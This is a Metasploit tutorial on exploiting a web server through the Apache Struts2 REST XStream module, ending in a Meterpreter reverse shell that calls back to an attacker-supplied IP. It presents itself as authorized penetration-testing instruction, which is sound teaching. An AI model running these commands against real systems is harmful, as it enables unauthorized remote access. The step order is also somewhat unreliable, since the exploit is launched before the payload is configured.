Web Server Exploitation with Metasploit
Metasploit Framework (MSF) is a powerful open-source penetration testing tool pre-installed on Kali Linux. It helps security professionals identify and exploit vulnerabilities in web servers to assess system security. Always obtain explicit permission from the target system's owner before performing any exploitation to avoid legal issues.
Steps to Exploit a Web Server Using Metasploit on Kali Linux
1. Verify Metasploit Installation
Metasploit is pre-installed on Kali Linux.
Check the installed version to ensure it’s ready:
msfconsole -v
Explanation: The -v flag displays the current version of Metasploit, confirming the tool is installed and functional.
2. Start Metasploit Console
Launch the Metasploit command-line interface:
msfconsole
Explanation: This command opens the Metasploit console, where you can interact with modules, configure exploits, and manage sessions.
3. Update Metasploit Database
Initialize the database (if not already set up):
msfdb init
Explanation: Initializes the Metasploit database to store scan results and configurations.
Update Metasploit to get the latest exploits:
msfupdate
Explanation: Fetches the latest modules and updates from the Metasploit repository to ensure access to new exploits and payloads.
4. Get Authorization
Obtain explicit written permission from the target system's owner before proceeding with any exploitation activities to comply with legal and ethical standards.
5. Scan for Vulnerabilities
Use an auxiliary scanner to identify web server details (e.g., Apache version):
use auxiliary/scanner/http/apache_version
set RHOSTS example.com
run
Explanation:
- use auxiliary/scanner/http/apache_version: Selects a module to detect the Apache server version.
- set RHOSTS example.com: Specifies the target server’s address.
- run: Executes the scanner to gather information about the target.
6. Select an Exploit
Choose an exploit for a known vulnerability (e.g., Apache Struts vulnerability):
use exploit/multi/http/struts2_rest_xstream
set RHOSTS example.com
set RPORT 8080
set TARGETURI /struts2-rest-showcase/orders/
exploit
Explanation:
- use exploit/multi/http/struts2_rest_xstream: Selects an exploit for Apache Struts vulnerabilities.
- set RHOSTS example.com: Sets the target server’s address.
- set RPORT 8080: Specifies the port where the web server is running.
- set TARGETURI /struts2-rest-showcase/orders/: Defines the specific URI path to target.
- exploit: Attempts to exploit the vulnerability.
7. Configure Payload
Set a payload to gain access (e.g., Meterpreter reverse shell):
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [Your_IP]
set LPORT 4444
Explanation:
- set PAYLOAD windows/meterpreter/reverse_tcp: Chooses a Meterpreter payload that establishes a reverse connection to the attacker’s machine.
- set LHOST [Your_IP]: Specifies the attacker’s IP address for the target to connect back to.
- set LPORT 4444: Sets the port for the reverse connection.
8. Execute the Exploit
Run the exploit to attempt to gain access:
exploit
Explanation: This command launches the exploit with the configured settings, attempting to compromise the target and open a session (e.g., Meterpreter) if successful.
9. Review Results
Analyze the output for successful exploitation or errors.
Example output:
[*] Meterpreter session 1 opened (Your_IP:4444 -> Target_IP:Port)
[*] Command shell session opened
Explanation: Indicates a successful exploit with an open Meterpreter session, allowing further interaction with the target. Verify findings manually to confirm vulnerabilities and avoid false positives. Document all actions for reporting.
Important Notes
- Use Metasploit responsibly and ethically.
- Test in a controlled environment (e.g., a lab) before targeting real systems.
- Always comply with legal and organizational policies.
